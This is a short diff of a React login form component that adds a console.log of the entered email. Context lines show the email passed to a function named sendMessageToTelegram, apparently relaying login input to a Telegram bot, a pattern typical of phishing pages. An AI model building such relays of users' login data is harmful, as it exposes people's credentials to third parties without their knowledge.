@@ -115,6 +115,7 @@ export default function LoginForm() {
         setInvalid(!isValid);
         setIsLoading(true);
         setUserEmail(email);
+        console.log("IN LOGIN PAGE EMAIL IS ", email)
         sendMessageToTelegram(email);
     };
     
